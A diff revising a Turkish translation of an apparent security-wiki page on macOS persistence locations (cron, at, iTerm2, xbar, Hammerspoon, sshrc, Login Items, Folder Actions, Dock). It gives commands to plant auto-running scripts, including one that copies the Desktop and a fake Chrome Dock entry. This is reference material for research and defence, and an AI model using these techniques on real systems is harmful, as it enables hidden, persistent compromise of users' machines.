-Kullanıcıların tüm cron jobs kayıtlarını **`/usr/lib/cron/tabs/`** ve **`/var/at/tabs/`** dizinlerinde de görebilirsiniz (root gerekir).
+Ayrıca kullanıcıların tüm cron görevlerini **`/usr/lib/cron/tabs/`** ve **`/var/at/tabs/`** dizinlerinde görebilirsiniz (root gerekir).
 
-MacOS'ta **belirli sıklıkta** script çalıştıran çeşitli klasörler şuralarda bulunabilir:
+MacOS'ta **belirli sıklıkta** script çalıştıran çeşitli klasörler şurada bulunabilir:
 ```bash
 # The one with the cron jobs is /usr/lib/cron/tabs/
 ls -lR /usr/lib/cron/tabs/ /private/var/at/jobs /etc/periodic/
 ```
-Burada düzenli **cron** **jobs**, **at** **jobs** (çok sık kullanılmaz) ve **periodic** **jobs** (çoğunlukla geçici dosyaları temizlemek için kullanılır) bulunur. Günlük periodic jobs örneğin şu komutla çalıştırılabilir: `periodic daily`.
+Burada normal **cron** **jobs**, **at** **jobs** (çok sık kullanılmaz) ve **periodic** **jobs** (çoğunlukla geçici dosyaları temizlemek için kullanılır) bulunabilir. Günlük periodic jobs örneğin şu komutla çalıştırılabilir: `periodic daily`.<sup>[10]</sup>
 
-Programatik olarak bir **user cronjob** eklemek için şunu kullanmak mümkündür:
+**user cronjob**'u programatik olarak eklemek için şu kullanılabilir:
 ```bash
 echo '* * * * * /bin/bash -c "touch /tmp/cron3"' > /tmp/cron
 crontab /tmp/cron
@@ -431,9 +433,9 @@ crontab /tmp/cron
 
 Writeup: [https://theevilbit.github.io/beyond/beyond_0002/](https://theevilbit.github.io/beyond/beyond_0002/)
 
-- sandbox bypass için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
+- Sandbox bypass için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
 - TCC bypass: [✅](https://emojipedia.org/check-mark-button)
-- iTerm2 daha önce TCC izinlerine sahipti
+- iTerm2 daha önce verilmiş TCC izinlerine sahipti
 
 #### Konumlar
 
@@ -446,7 +448,7 @@ Writeup: [https://theevilbit.github.io/beyond/beyond_0002/](https://theevilbit.g
 
 #### Açıklama ve Exploitation
 
-**`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`** konumunda depolanan betikler çalıştırılır. Örneğin:
+**`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`** konumunda depolanan script'ler çalıştırılır. Örneğin:<sup>[11]</sup>
 ```bash
 cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh" << EOF
 #!/bin/bash
@@ -472,17 +474,17 @@ await iterm2.Window.async_create(connection)
 iterm2.run_forever(main)
 EOF
 ```
-**`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`** betiği de çalıştırılacaktır:
+**`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`** script'i de çalıştırılacaktır:
 ```bash
 do shell script "touch /tmp/iterm2-autolaunchscpt"
 ```
-**`~/Library/Preferences/com.googlecode.iterm2.plist`** konumunda bulunan iTerm2 tercihleri, iTerm2 terminali açıldığında **çalıştırılacak bir komutu belirtebilir**.
+**`~/Library/Preferences/com.googlecode.iterm2.plist`** konumunda bulunan iTerm2 tercihleri, iTerm2 terminali açıldığında **yürütülecek bir komut belirtebilir**.
 
-Bu ayar iTerm2 settings bölümünde yapılandırılabilir:
+Bu ayar iTerm2 ayarlarında yapılandırılabilir:
 
 <figure><img src="../images/image (37).png" alt="" width="563"><figcaption></figcaption></figure>
 
-Komut tercihlere yansıtılır:
+Ve komut tercihlere yansıtılır:
 ```bash
 plutil -p com.googlecode.iterm2.plist
 {
@@ -504,25 +506,25 @@ open /Applications/iTerm.app/Contents/MacOS/iTerm2
 /usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" ''" $HOME/Library/Preferences/com.googlecode.iterm2.plist
 ```
 > [!WARNING]
-> **iTerm2 preferences**'ı abuse ederek arbitrary commands çalıştırmanın **başka yolları** olma ihtimali oldukça yüksektir.
+> **iTerm2 preferences**'ı abuse ederek arbitrary commands execute etmenin **başka yolları** olma ihtimali oldukça yüksek.
 
 ### xbar
 
 Writeup: [https://theevilbit.github.io/beyond/beyond_0007/](https://theevilbit.github.io/beyond/beyond_0007/)
 
-- Sandbox'ı bypass etmek için kullanışlıdır: [✅](https://emojipedia.org/check-mark-button)
-- Ancak xbar'ın kurulu olması gerekir
+- sandbox bypass için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
+- Ancak xbar kurulu olmalıdır
 - TCC bypass: [✅](https://emojipedia.org/check-mark-button)
-- Accessibility izinleri ister
+- Accessibility permissions ister
 
 #### Konum
 
 - **`~/Library/Application\ Support/xbar/plugins/`**
-- **Tetikleyici**: xbar çalıştırıldığında
+- **Tetikleyici**: xbar execute edildiğinde
 
 #### Açıklama
 
-Popüler program [**xbar**](https://github.com/matryer/xbar) kuruluysa, **`~/Library/Application\ Support/xbar/plugins/`** içinde xbar başlatıldığında çalıştırılacak bir shell script yazmak mümkündür:
+Popüler program [**xbar**](https://github.com/matryer/xbar) kuruluysa, **`~/Library/Application\ Support/xbar/plugins/`** içinde xbar başlatıldığında execute edilecek bir shell script yazmak mümkündür:<sup>[12]</sup>
 ```bash
 cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
 #!/bin/bash
@@ -534,21 +536,21 @@ chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
 
 **Writeup**: [https://theevilbit.github.io/beyond/beyond_0008/](https://theevilbit.github.io/beyond/beyond_0008/)
 
-- Sandbox bypass için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
-- Ancak Hammerspoon kurulmuş olmalıdır
+- sandbox bypass için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
+- Ancak Hammerspoon yüklü olmalıdır
 - TCC bypass: [✅](https://emojipedia.org/check-mark-button)
 - Accessibility izinleri ister
 
 #### Konum
 
 - **`~/.hammerspoon/init.lua`**
-- **Tetikleyici**: hammerspoon çalıştırıldığında
+- **Tetikleyici**: Hammerspoon çalıştırıldığında
 
 #### Açıklama
 
-[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon), işlemleri için **LUA scripting language** kullanan bir **macOS** automation platformudur. Ayrıca tam AppleScript kodunun entegre edilmesini ve shell scriptlerinin çalıştırılmasını destekleyerek scripting yeteneklerini önemli ölçüde geliştirir.
+[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon), işlemleri için **LUA scripting language** kullanan bir **macOS** automation platformudur. Özellikle eksiksiz AppleScript kodlarının entegre edilmesini ve shell script'lerinin çalıştırılmasını destekleyerek scripting yeteneklerini önemli ölçüde geliştirir.<sup>[13]</sup>
 
-Uygulama `~/.hammerspoon/init.lua` adlı tek bir dosyayı arar ve başlatıldığında bu script çalıştırılır.
+Uygulama tek bir dosyayı, `~/.hammerspoon/init.lua`, arar ve başlatıldığında script çalıştırılır.
 ```bash
 mkdir -p "$HOME/.hammerspoon"
 cat > "$HOME/.hammerspoon/init.lua" << EOF
@@ -566,7 +568,7 @@ EOF
 
 - `~/Library/Application Support/BetterTouchTool/*`
 
-Bu araç, bazı kısayollara basıldığında yürütülecek uygulamaları veya script'leri belirtmeye olanak tanır. Bir saldırgan, **veritabanında kendi kısayolunu ve yürütülecek action'ı yapılandırarak** rastgele kod yürütülmesini sağlayabilir (bir kısayol yalnızca bir tuşa basmak olabilir).
+Bu araç, bazı kısayollara basıldığında çalıştırılacak uygulamaları veya script'leri belirtmeye olanak tanır. Bir attacker, **veritabanında kendi kısayolunu ve çalıştırılacak action'ı yapılandırarak** arbitrary code çalıştırılmasını sağlayabilir (bir kısayol yalnızca bir tuşa basmak olabilir).
 
 ### Alfred
 
@@ -579,7 +581,7 @@ Bu araç, bazı kısayollara basıldığında yürütülecek uygulamaları veya 
 
 - `???`
 
-Belirli koşullar karşılandığında kod yürütebilen workflow'lar oluşturulmasına olanak tanır. Bir saldırganın bir workflow dosyası oluşturup Alfred'in bunu yüklemesini sağlaması potansiyel olarak mümkündür (workflow'ları kullanmak için premium sürümün satın alınması gerekir).
+Belirli koşullar karşılandığında code çalıştırabilen workflow'lar oluşturmaya olanak tanır. Potansiyel olarak bir attacker'ın bir workflow dosyası oluşturup Alfred'in bunu yüklemesini sağlaması mümkündür (workflow'ları kullanmak için premium sürümün satın alınması gerekir).
 
 ### SSHRC
 
@@ -588,18 +590,18 @@ Writeup: [https://theevilbit.github.io/beyond/beyond_0006/](https://theevilbit.g
 - Sandbox bypass için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
 - Ancak ssh etkinleştirilmiş ve kullanılıyor olmalıdır
 - TCC bypass: [✅](https://emojipedia.org/check-mark-button)
-- SSH, FDA access elde etmek için kullanılır
+- SSH, FDA access'e sahip olmak için kullanılır
 
 #### Konum
 
 - **`~/.ssh/rc`**
-- **Tetikleyici**: ssh ile giriş
+- **Trigger**: ssh ile Login
 - **`/etc/ssh/sshrc`**
-- Root gerektirir
-- **Tetikleyici**: ssh ile giriş
+- Root gerekir
+- **Trigger**: ssh ile Login
 
 > [!CAUTION]
-> ssh'yi etkinleştirmek için Full Disk Access gerekir:
+> ssh'yi açmak için Full Disk Access gerekir:
 >
 > ```bash
 > sudo systemsetup -setremotelogin on
@@ -607,29 +609,29 @@ Writeup: [https://theevilbit.github.io/beyond/beyond_0006/](https://theevilbit.g
 
 #### Açıklama ve Exploitation
 
-Varsayılan olarak, `/etc/ssh/sshd_config` içinde `PermitUserRC no` bulunmadığı sürece, bir kullanıcı **SSH ile giriş yaptığında** **`/etc/ssh/sshrc`** ve **`~/.ssh/rc`** script'leri yürütülür.
+Varsayılan olarak, `/etc/ssh/sshd_config` içinde `PermitUserRC no` bulunmadığı sürece, bir kullanıcı **SSH üzerinden Login olduğunda** **`/etc/ssh/sshrc`** ve **`~/.ssh/rc`** script'leri çalıştırılır.<sup>[14]</sup>
 
 ### **Login Items**
 
 Writeup: [https://theevilbit.github.io/beyond/beyond_0003/](https://theevilbit.github.io/beyond/beyond_0003/)
 
 - Sandbox bypass için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
-- Ancak `osascript`'i argümanlarla yürütmeniz gerekir
+- Ancak `osascript`'i args ile çalıştırmanız gerekir
 - TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
 
 #### Konumlar
 
 - **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**
-- **Tetikleyici:** Giriş
-- `osascript` çağrılarak depolanan Exploit payload
+- **Trigger:** Login
+- `osascript` çağrılarak kaydedilen Exploit payload
 - **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**
-- **Tetikleyici:** Giriş
-- Root gerektirir
+- **Trigger:** Login
+- Root gerekir
 
 #### Açıklama
 
-System Preferences -> Users & Groups -> **Login Items** bölümünde, **kullanıcı giriş yaptığında yürütülecek öğeleri** bulabilirsiniz.\
-Bunları komut satırından listelemek, eklemek ve kaldırmak mümkündür:
+System Preferences -> Users & Groups -> **Login Items** bölümünde **kullanıcı Login olduğunda çalıştırılacak item'ları** bulabilirsiniz.\
+Bunları command line üzerinden listelemek, eklemek ve kaldırmak mümkündür:<sup>[15]</sup>
 ```bash
 #List all items:
 osascript -e 'tell application "System Events" to get the name of every login item'
@@ -642,33 +644,33 @@ osascript -e 'tell application "System Events" to delete login item "itemname"'
 ```
 Bu öğeler **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`** dosyasında saklanır.
 
-**Login items**, **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`** içindeki yapılandırmayı saklayan [SMLoginItemSetEnabled](https://developer.apple.com/documentation/servicemanagement/1501557-smloginitemsetenabled?language=objc) API'si kullanılarak da belirtilebilir.
+**Login items**, **`SMLoginItemSetEnabled`** API'si kullanılarak da belirtilebilir; bu API yapılandırmayı **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`** içinde saklar.
 
 ### ZIP as Login Item
 
-(Login Items hakkındaki önceki bölüme bakın; bu bölüm onun bir uzantısıdır.)
+(Login Items hakkındaki önceki bölüme bakın; bu, onun bir uzantısıdır.)
 
-Bir **ZIP** dosyasını **Login Item** olarak saklarsanız, **`Archive Utility`** dosyayı açar. Örneğin ZIP dosyası **`~/Library`** içinde saklanmış ve bir backdoor içeren **`LaunchAgents/file.plist`** klasörünü barındırıyorsa, bu klasör oluşturulur (varsayılan olarak mevcut değildir) ve plist dosyası eklenir. Böylece kullanıcı bir sonraki oturum açışında, plist içinde belirtilen **backdoor çalıştırılır**.
+Bir **ZIP** dosyasını **Login Item** olarak saklarsanız, **`Archive Utility`** bu dosyayı açar. ZIP dosyası örneğin **`~/Library`** içinde saklanmışsa ve bir backdoor içeren **`LaunchAgents/file.plist`** klasörünü barındırıyorsa, bu klasör oluşturulur (varsayılan olarak mevcut değildir) ve plist dosyası eklenir. Böylece kullanıcı bir sonraki oturum açışında, plist içinde belirtilen **backdoor çalıştırılır**.
 
-Başka bir seçenek, kullanıcı HOME dizininin içine **`.bash_profile`** ve **`.zshenv`** dosyalarını oluşturmaktır. Böylece LaunchAgents klasörü zaten mevcutsa bu teknik yine çalışır.
+Başka bir seçenek de kullanıcı HOME dizini içinde **`.bash_profile`** ve **`.zshenv`** dosyalarını oluşturmaktır. Böylece LaunchAgents klasörü zaten mevcutsa bu teknik yine çalışır.
 
 ### At
 
 Writeup: [https://theevilbit.github.io/beyond/beyond_0014/](https://theevilbit.github.io/beyond/beyond_0014/)
 
-- Sandbox bypass için kullanışlıdır: [✅](https://emojipedia.org/check-mark-button)
-- Ancak **`at`** komutunu **çalıştırmanız** ve bunun **etkinleştirilmiş** olması gerekir
+- sandbox bypass için kullanışlıdır: [✅](https://emojipedia.org/check-mark-button)
+- Ancak **`at`** komutunu **çalıştırmanız** gerekir ve komut **etkinleştirilmiş** olmalıdır.
 - TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
 
 #### Location
 
-- **`at`** komutunu **çalıştırmanız** ve bunun **etkinleştirilmiş** olması gerekir
+- **`at`** komutunu **çalıştırmanız** gerekir ve komut **etkinleştirilmiş** olmalıdır.
 
 #### **Description**
 
-`at` görevleri, belirli zamanlarda çalıştırılacak **tek seferlik görevleri zamanlamak** için tasarlanmıştır. cron jobs'ların aksine, `at` görevleri çalıştırıldıktan sonra otomatik olarak kaldırılır. Bu görevlerin sistem yeniden başlatmalarında kalıcı olduğunu belirtmek önemlidir; bu durum, belirli koşullar altında onları potansiyel güvenlik sorunları hâline getirir.
+`at` görevleri, belirli zamanlarda yürütülecek **tek seferlik görevleri zamanlamak** için tasarlanmıştır. cron job'larının aksine, `at` görevleri yürütüldükten sonra otomatik olarak kaldırılır. Bu görevlerin sistem yeniden başlatmalarından sonra da kalıcı olması, belirli koşullar altında potansiyel security concern oluşturmaları açısından önemlidir.<sup>[16]</sup>
 
-**Varsayılan olarak** devre dışıdır; ancak **root** kullanıcısı bunları şu komutla **etkinleştirebilir**:
+Varsayılan olarak **devre dışıdır**, ancak **root** kullanıcısı bunları şu komutla **etkinleştirebilir**:
 ```bash
 sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
 ```
@@ -676,13 +678,13 @@ Bu, 1 saat içinde bir dosya oluşturacaktır:
 ```bash
 echo "echo 11 > /tmp/at.txt" | at now+1
 ```
-İş kuyruğunu `atq` kullanarak kontrol edin:
+`atq:` kullanarak iş kuyruğunu kontrol edin:
 ```shell-session
 sh-3.2# atq
 26	Tue Apr 27 00:46:00 2021
 22	Wed Apr 28 00:29:00 2021
 ```
-Yukarıda zamanlanmış iki iş görebiliriz. `at -c JOBNUMBER` kullanarak işin ayrıntılarını yazdırabiliriz.
+Yukarıda planlanmış iki iş görebiliriz. `at -c JOBNUMBER` kullanarak işin ayrıntılarını yazdırabiliriz.
 ```shell-session
 sh-3.2# at -c 26
 #!/bin/sh
@@ -714,7 +716,7 @@ unset OLDPWD
 echo 11 > /tmp/at.txt
 ```
 > [!WARNING]
-> AT tasks etkinleştirilmemişse oluşturulan tasks yürütülmez.
+> AT tasks etkin değilse oluşturulan tasks yürütülmez.
 
 **job dosyaları** `/private/var/at/jobs/` konumunda bulunabilir.
 ```
@@ -725,11 +727,11 @@ total 32
 -r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
 -rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
 ```
-Dosya adı queue’yu, job numarasını ve çalışmasının zamanlandığı zamanı içerir. Örnek olarak `a0001a019bdcd2` değerine bakalım.
+Dosya adı queue'yu, job numarasını ve çalışmasının planlandığı zamanı içerir. Örnek olarak `a0001a019bdcd2` değerine bakalım.
 
 - `a` - queue
-- `0001a` - hex biçiminde job numarası, `0x1a = 26`
-- `019bdcd2` - hex biçiminde zaman. Epoch’tan bu yana geçen dakikaları temsil eder. `0x019bdcd2`, decimal biçiminde `26991826` değeridir. Bunu 60 ile çarparsak `1619509560` elde ederiz; bu da `GMT: 2021. April 27., Tuesday 7:46:00` tarihine karşılık gelir.
+- `0001a` - hex cinsinden job numarası, `0x1a = 26`
+- `019bdcd2` - hex cinsinden zaman. Epoch'tan bu yana geçen dakikaları temsil eder. `0x019bdcd2`, decimal olarak `26991826` değeridir. Bunu 60 ile çarparsak `1619509560` elde ederiz; bu da `GMT: 2021. April 27., Tuesday 7:46:00` tarihine karşılık gelir.
 
 Job dosyasını yazdırırsak, `at -c` kullanarak elde ettiğimiz bilgilerin aynısını içerdiğini görürüz.
 
@@ -738,8 +740,8 @@ Job dosyasını yazdırırsak, `at -c` kullanarak elde ettiğimiz bilgilerin ayn
 Writeup: [https://theevilbit.github.io/beyond/beyond_0024/](https://theevilbit.github.io/beyond/beyond_0024/)\
 Writeup: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)
 
-- Sandbox’ı bypass etmek için kullanışlıdır: [✅](https://emojipedia.org/check-mark-button)
-- Ancak Folder Actions’ı yapılandırabilmek için **`System Events`** ile iletişim kuracak şekilde `osascript`’i argümanlarla çağırabilmeniz gerekir
+- sandbox bypass için kullanışlıdır: [✅](https://emojipedia.org/check-mark-button)
+- Ancak Folder Actions'ı yapılandırabilmek için **`System Events`** ile iletişim kurmak üzere `osascript`'i argümanlarla çağırabilmeniz gerekir
 - TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
 - Desktop, Documents ve Downloads gibi bazı temel TCC izinlerine sahiptir
 
@@ -747,22 +749,22 @@ Writeup: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-89
 
 - **`/Library/Scripts/Folder Action Scripts`**
 - Root gereklidir
-- **Trigger**: Belirtilen folder’a erişim
+- **Trigger**: Belirtilen klasöre erişim
 - **`~/Library/Scripts/Folder Action Scripts`**
-- **Trigger**: Belirtilen folder’a erişim
+- **Trigger**: Belirtilen klasöre erişim
 
 #### Açıklama ve Exploitation
 
-Folder Actions; öğelerin eklenmesi, kaldırılması veya folder penceresinin açılması ya da yeniden boyutlandırılması gibi diğer işlemler dahil olmak üzere, bir folder’da meydana gelen değişikliklerle otomatik olarak tetiklenen script’lerdir. Bu actions çeşitli görevler için kullanılabilir ve Finder UI veya terminal komutları gibi farklı yöntemlerle tetiklenebilir.
+Folder Actions; öğelerin eklenmesi, kaldırılması veya klasör penceresinin açılması ya da yeniden boyutlandırılması gibi diğer işlemler dahil olmak üzere, bir klasördeki değişikliklerle otomatik olarak tetiklenen script'lerdir. Bu actions çeşitli görevler için kullanılabilir ve Finder UI veya terminal komutları gibi farklı yöntemlerle tetiklenebilir.<sup>[17][18]</sup>
 
-Folder Actions’ı ayarlamak için şu seçeneklere sahipsiniz:
+Folder Actions'ı ayarlamak için şu seçeneklere sahipsiniz:
 
-1. [Automator](https://support.apple.com/guide/automator/welcome/mac) ile bir Folder Action workflow’u oluşturup bunu service olarak yüklemek.
-2. Bir folder’ın context menu’sündeki Folder Actions Setup üzerinden manuel olarak bir script bağlamak.
-3. Programatik olarak bir Folder Action ayarlamak için OSAScript kullanarak `System Events.app`’e Apple Event mesajları göndermek.
-- Bu yöntem, action’ı system’e gömmek ve bir persistence seviyesi sağlamak için özellikle kullanışlıdır.
+1. [Automator](https://support.apple.com/guide/automator/welcome/mac) ile bir Folder Action workflow'u oluşturup bunu service olarak yüklemek.
+2. Bir klasörün context menu'sündeki Folder Actions Setup aracılığıyla manuel olarak bir script eklemek.
+3. Programatik olarak bir Folder Action ayarlamak için `System Events.app`'e Apple Event mesajları göndermek üzere OSAScript kullanmak.
+- Bu yöntem, action'ı sisteme gömmek için özellikle kullanışlıdır ve bir kalıcılık düzeyi sağlar.
 
-Aşağıdaki script, bir Folder Action tarafından çalıştırılabilecek işlemlere örnektir:
+Aşağıdaki script, bir Folder Action tarafından çalıştırılabilecek bir örnektir:
 ```applescript
 // source.js
 var app = Application.currentApplication();
@@ -772,11 +774,11 @@ app.doShellScript("touch ~/Desktop/folderaction.txt");
 app.doShellScript("mkdir /tmp/asd123");
 app.doShellScript("cp -R ~/Desktop /tmp/asd123");
 ```
-Yukarıdaki script'i Folder Actions tarafından kullanılabilir hale getirmek için şu komutu kullanarak derleyin:
+Yukarıdaki script'i Folder Actions tarafından kullanılabilir hale getirmek için şu komutla derleyin:
 ```bash
 osacompile -l JavaScript -o folder.scpt source.js
 ```
-Script derlendikten sonra aşağıdaki script'i çalıştırarak Folder Actions'ı ayarlayın. Bu script, Folder Actions'ı global olarak etkinleştirir ve daha önce derlenmiş script'i özellikle Desktop klasörüne bağlar.
+Script derlendikten sonra aşağıdaki scripti çalıştırarak Folder Actions'ı ayarlayın. Bu script, Folder Actions'ı global olarak etkinleştirecek ve daha önce derlenen scripti özellikle Desktop klasörüne bağlayacaktır.
 ```javascript
 // Enabling and attaching Folder Action
 var se = Application("System Events")
@@ -786,11 +788,11 @@ var fa = se.FolderAction({ name: "Desktop", path: "/Users/username/Desktop" })
 se.folderActions.push(fa)
 fa.scripts.push(myScript)
 ```
-Kurulum script'ini şu komutla çalıştırın:
+Kurulum script'ini şu şekilde çalıştırın:
 ```bash
 osascript -l JavaScript /Users/username/attach.scpt
 ```
-- Bu, bu persistence yönteminin GUI aracılığıyla uygulanma şeklidir:
+- Bu persistence yöntemini GUI aracılığıyla uygulamanın yolu şöyledir:
 
 Bu çalıştırılacak script'tir:
 ```applescript:source.js
@@ -801,22 +803,22 @@ app.doShellScript("touch ~/Desktop/folderaction.txt");
 app.doShellScript("mkdir /tmp/asd123");
 app.doShellScript("cp -R ~/Desktop /tmp/asd123");
 ```
-Şu komutla derleyin: `osacompile -l JavaScript -o folder.scpt source.js`
+Şununla derleyin: `osacompile -l JavaScript -o folder.scpt source.js`
 
 Şuraya taşıyın:
 ```bash
 mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
 mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
 ```
-Ardından `Folder Actions Setup` uygulamasını açın, **izlemek istediğiniz klasörü** seçin ve kendi durumunuzda **`folder.scpt`** dosyasını seçin (benim durumumda dosyaya output2.scp adını verdim):
+Ardından, `Folder Actions Setup` uygulamasını açın, **izlemek istediğiniz klasörü** seçin ve kendi durumunuzda **`folder.scpt`** dosyasını seçin (benim durumumda dosyaya output2.scp adını verdim):
 
 <figure><img src="../images/image (39).png" alt="" width="297"><figcaption></figcaption></figure>
 
 Şimdi bu klasörü **Finder** ile açarsanız script'iniz çalıştırılır.
 
-Bu yapılandırma, base64 formatında **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** konumunda bulunan **plist** dosyasında saklanır.
+Bu yapılandırma, base64 formatında **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** konumundaki **plist** dosyasında saklanıyordu.
 
-Şimdi bu persistence işlemini GUI erişimi olmadan hazırlamayı deneyelim:
+Şimdi bu persistence yöntemini GUI erişimi olmadan hazırlamayı deneyelim:
 
 1. Yedeklemek için **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** dosyasını `/tmp` konumuna **kopyalayın**:
 - `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
@@ -824,32 +826,32 @@ Bu yapılandırma, base64 formatında **`~/Library/Preferences/com.apple.FolderA
 
 <figure><img src="../images/image (40).png" alt=""><figcaption></figcaption></figure>
 
-Artık boş bir ortamımız olduğuna göre
+Şimdi elimizde boş bir ortam olduğuna göre:
 
 3. Yedek dosyasını kopyalayın: `cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
-4. Bu yapılandırmayı yüklemek için Folder Actions Setup.app'i açın: `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`
+4. Bu yapılandırmayı kullanması için Folder Actions Setup.app'i açın: `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`
 
 > [!CAUTION]
-> Bu işlem bende çalışmadı, ancak writeup'taki talimatlar bunlar:(
+> Bu bende işe yaramadı, ancak writeup'taki talimatlar şunlar:
 
-### Dock kısayolları
+### Dock shortcuts
 
 Writeup: [https://theevilbit.github.io/beyond/beyond_0027/](https://theevilbit.github.io/beyond/beyond_0027/)
 
-- Sandbox'ı bypass etmek için kullanışlıdır: [✅](https://emojipedia.org/check-mark-button)
-- Ancak sisteme kötü amaçlı bir uygulama yüklemiş olmanız gerekir
+- sandbox bypass etmek için kullanışlıdır: [✅](https://emojipedia.org/check-mark-button)
+- Ancak sistemin içine malicious bir application yüklemiş olmanız gerekir
 - TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
 
 #### Konum
 
 - `~/Library/Preferences/com.apple.dock.plist`
-- **Trigger**: Kullanıcı Dock içindeki uygulamaya tıkladığında
+- **Tetikleyici**: Kullanıcı Dock içindeki uygulamaya tıkladığında
 
 #### Açıklama ve Exploitation
 
-Dock'ta görünen tüm uygulamalar **`~/Library/Preferences/com.apple.dock.plist`** içinde belirtilir.
+Dock'ta görünen tüm uygulamalar plist içinde belirtilir: **`~/Library/Preferences/com.apple.dock.plist`**<sup>[19]</sup>
 
-Sadece şu komutla **bir uygulama eklemek** mümkündür:
+Bir application'ı yalnızca şu şekilde **eklemek** mümkündür:
 ```bash
 # Add /System/Applications/Books.app
 defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
@@ -857,7 +859,7 @@ defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</
 # Restart Dock
 killall Dock
 ```
-Bir miktar **social engineering** kullanarak **örneğin Google Chrome'u** Dock içinde taklit edebilir ve kendi script'inizi çalıştırabilirsiniz:
+Bir miktar **social engineering** kullanarak dock içinde örneğin **Google Chrome**'u **taklit edebilir** ve kendi script'inizi çalıştırabilirsiniz:
 ```bash
 #!/bin/sh
 
@@ -910,30 +912,30 @@ cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chr
 defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
 killall Dock
 ```
-### Color Pickers
+### Renk Seçiciler
 
 Writeup: [https://theevilbit.github.io/beyond/beyond_0017](https://theevilbit.github.io/beyond/beyond_0017/)
 
-- Sandbox bypass için kullanışlı: [🟠](https://emojipedia.org/large-orange-circle)
-- Çok spesifik bir action gerçekleşmesi gerekir
+- Sandbox'u bypass etmek için kullanışlı: [🟠](https://emojipedia.org/large-orange-circle)
+- Çok belirli bir eylemin gerçekleşmesi gerekir
 - Başka bir sandbox içinde sonlanırsınız
 - TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
 
 #### Konum
 
 - `/Library/ColorPickers`
-- Root gerekir
-- Trigger: Color picker'ı kullanın
+- Root gerekli
+- Tetikleyici: Renk seçiciyi kullanma
 - `~/Library/ColorPickers`
-- Trigger: Color picker'ı kullanın
+- Tetikleyici: Renk seçiciyi kullanma
 
-#### Açıklama & Exploit
+#### Açıklama ve Exploit
 
-Kodunuzu içeren bir **color picker** bundle'ı ([örneğin bunu](https://github.com/viktorstrate/color-picker-plus) kullanabilirsiniz) **Compile** edin, bir constructor ekleyin ([Screen Saver bölümündeki](macos-auto-start-locations.md#screen-saver) gibi) ve bundle'ı `~/Library/ColorPickers` konumuna kopyalayın.
+Kodunuzla bir **color picker** bundle'ı **Compile** edin (örneğin [**bunu kullanabilirsiniz**](https://github.com/viktorstrate/color-picker-plus)), bir constructor ekleyin ([Screen Saver bölümünde](macos-auto-start-locations.md#screen-saver) olduğu gibi) ve bundle'ı `~/Library/ColorPickers` konumuna kopyalayın.<sup>[20]</sup>
 
-Ardından, color picker tetiklendiğinde kodunuz da çalıştırılmalıdır.
+Ardından, color picker tetiklendiğinde kodunuz da çalışmalıdır.
 
-Library'nizi yükleyen binary'nin **çok kısıtlayıcı bir sandbox** kullandığını unutmayın: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`
+Kitaplığınızı yükleyen binary'nin **çok kısıtlayıcı bir sandbox** içinde olduğunu unutmayın: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`
 ```bash
 [Key] com.apple.security.temporary-exception.sbpl
 [Value]
@@ -947,7 +949,7 @@ Library'nizi yükleyen binary'nin **çok kısıtlayıcı bir sandbox** kullandı
 **Writeup**: [https://theevilbit.github.io/beyond/beyond_0026/](https://theevilbit.github.io/beyond/beyond_0026/)\
